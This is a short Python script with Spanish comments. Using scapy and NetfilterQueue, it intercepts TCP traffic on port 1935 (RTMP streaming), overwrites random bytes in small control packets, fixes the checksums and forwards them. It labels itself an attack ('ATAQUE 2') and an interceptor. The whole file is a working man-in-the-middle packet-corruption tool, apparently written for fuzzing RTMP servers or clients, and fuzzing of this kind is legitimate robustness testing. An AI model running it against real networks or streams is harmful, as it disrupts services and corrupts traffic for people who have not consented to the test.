from scapy.all import *
from netfilterqueue import NetfilterQueue
import random

def procesar_paquete(packet):
    scapy_pkt = IP(packet.get_payload())
    
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        if scapy_pkt[TCP].dport == 1935 or scapy_pkt[TCP].sport == 1935:
            payload = bytearray(scapy_pkt[Raw].load)
            
            # --- ATAQUE 2: FUZZING DE CONTROL ---
            if len(payload) < 300 and len(payload) > 10:
                for _ in range(5):
                    posicion = random.randint(0, len(payload) - 1)
                    payload[posicion] = random.randint(0, 255)
                print(f"[!] FUZZING 2: Comando de control corrompido! (Tamaño: {len(payload)} bytes)")
            
            scapy_pkt[Raw].load = bytes(payload)
            
            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[TCP].chksum
            
            packet.set_payload(bytes(scapy_pkt))
            
    packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, procesar_paquete)

print("[*] Interceptor Klis activado: Fuzzing 2 (Control)...")
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[*] Apagando interceptor...")
nfqueue.unbind()
